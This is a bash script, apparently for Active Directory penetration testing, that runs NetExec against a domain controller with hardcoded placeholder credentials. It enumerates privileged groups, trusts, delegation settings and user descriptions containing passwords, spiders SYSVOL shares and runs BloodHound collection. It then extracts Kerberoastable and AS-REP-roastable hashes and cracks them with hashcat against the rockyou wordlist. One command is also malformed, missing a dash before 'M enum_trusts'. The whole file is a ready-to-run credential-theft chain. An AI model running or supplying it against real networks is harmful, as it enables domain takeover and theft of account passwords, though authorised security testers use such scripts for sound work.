#!/bin/bash

# Set target IP address
target="192.168.100.100"

# Set credentials
username="john.doe"
password="Password1234"

# Function to enumerate group members
enumerate_group() {
  group=$1
  echo "Enumerating members of group: $group"
  nxc ldap $target -u "$username" -p "$password" -M group-mem -o GROUP="$group"
  echo ""
}

# Enumerate Tier 0 groups
enumerate_group "Enterprise Admins"
enumerate_group "Schema Admins"
enumerate_group "Domain Admins"
# Enumerate Tier 1 groups
enumerate_group "Administrators"
enumerate_group "Account Operators"
enumerate_group "Backup Operators"
enumerate_group "Print Operators"
enumerate_group "Server Operators"
enumerate_group "Group Policy Creator Owners"
# Enumerate other important groups
enumerate_group "Denied RODC Password Replication Group"
enumerate_group "DnsAdmins"

echo "Enumerate Active Users"
nxc ldap $target -u "$username" -p "$password" --active-users

echo "Enumerate Kerberoastable Accounts"
nxc ldap $target -u "$username" -p "$password" --kerberoasting kerberoasting.txt

echo "Enumerate ASREP Accounts"
nxc ldap $target -u "$username" -p "$password" --asreproast asreproast.txt

echo "List Domain Controllers"
nxc ldap $target -u "$username" -p "$password" --dc-list

echo "Enumerate Domain Trusts"
nxc ldap $target -u "$username" -p "$password" M enum_trusts

echo "Computers with the flag trusted for delegation"
nxc ldap $target -u "$username" -p "$password" --trusted-for-delegation

echo "Machine Account Quota"
nxc ldap $target -u "$username" -p "$password" -M maq

echo "Check LDAP Signing"
nxc ldap $target -u "$username" -p "$password" -M ldap-checker

echo "Check User Descriptions for Passwords"
echo "Check User Descriptions for pass*"
nxc ldap $target -u "$username" -p "$password" -M get-desc-users -o FILTER=pass
echo "Check User Descriptions for temp*"
nxc ldap $target -u "$username" -p "$password" -M get-desc-users -o FILTER=temp
echo "Check User Descriptions for del*"
nxc ldap $target -u "$username" -p "$password" -M get-desc-users -o FILTER=del
echo "Check User Descriptions for cred*"
nxc ldap $target -u "$username" -p "$password" -M get-desc-users -o FILTER=cred
echo "Check User Descriptions for admin*"
nxc ldap $target -u "$username" -p "$password" -M get-desc-users -o FILTER=admin
echo "Check User Descriptions for log*"
nxc ldap $target -u "$username" -p "$password" -M get-desc-users -o FILTER=log
echo "Check User Descriptions for serv*"
nxc ldap $target -u "$username" -p "$password" -M get-desc-users -o FILTER=serv

echo "Scan Domain Controller Sysvol and Netlogon for interesting files"
nxc smb $target -u "$username" -p "$password" -M spider_plus

echo "Run Bloodhound Ingester"
nxc ldap $target -u "$username" -p "$password" --bloodhound --collection ALL

echo "Start Cracking Kerberoastable Hashes"
hashcat -m 13100 kerberoasting.txt /usr/share/wordlists/rockyou.txt -O

echo "Start Cracking Asrepoastable Hashes"
hashcat -m 18200 asreproast.txt /usr/share/wordlists/rockyou.txt -O



 



